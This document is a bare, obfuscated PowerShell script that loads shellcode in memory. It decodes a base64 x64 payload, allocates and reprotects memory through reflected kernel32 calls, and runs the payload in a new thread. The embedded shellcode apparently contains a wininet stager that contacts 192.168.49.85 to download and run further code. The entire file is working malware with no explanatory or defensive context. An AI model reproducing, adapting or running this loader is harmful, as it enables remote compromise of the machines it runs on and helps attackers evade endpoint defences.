function deQj {
        Param ($g8h, $n2DZb)
        $hJD = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $hJD.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($hJD.GetMethod('GetModuleHandle')).Invoke($null, @($g8h)))), $n2DZb))
}

function zQCP {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $f89x,
                [Parameter(Position = 1)] [Type] $n0 = [Void]
        )

        $eF = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $eF.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $f89x).SetImplementationFlags('Runtime, Managed')
        $eF.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $n0, $f89x).SetImplementationFlags('Runtime, Managed')

        return $eF.CreateType()
}

[Byte[]]$u_ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A4AAAAxOTIuMTY4LjQ5Ljg1AFpIicFJx8BAHwAATTHJU1NqA1NJuleJn8YAAAAA/9XoyQAAAC9OZzJweDRPX0ViN1MyTlBhdHQ3SlVnYTQxdEpfY2tMSFM2dUdLdWNzdmE3VV9WSVpyaHRibzM2bVZJcm1GYURTTnFsT3pXejRmUU1uekxFSEFHVnpTbklWTGNXNGgyREhsdENtSjBnSDZuYm9nTC04MzhXNFM1TmxlOUNhNlV6TGxJUnN5c3JKMHBtdTVWa2wxU0NIeWV3THVEcHRjSlMzYTdpWXlMNFVLNHdnbTBfeHd6cVB0VC1tY0c2aGFFOFBNVUxCUm83AEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$ypRk = 0
$k7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((deQj kernel32.dll VirtualAlloc), (zQCP @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $u_.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($u_, 0, $k7, $u_.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((deQj kernel32.dll VirtualProtect), (zQCP @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($k7, [Uint32]$u_.Length, 0x10, [Ref]$ypRk)) -eq $true) {
        $zdRS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((deQj kernel32.dll CreateThread), (zQCP @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$k7,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((deQj kernel32.dll WaitForSingleObject), (zQCP @([IntPtr], [Int32]))).Invoke($zdRS,0xffffffff) | Out-Null
}
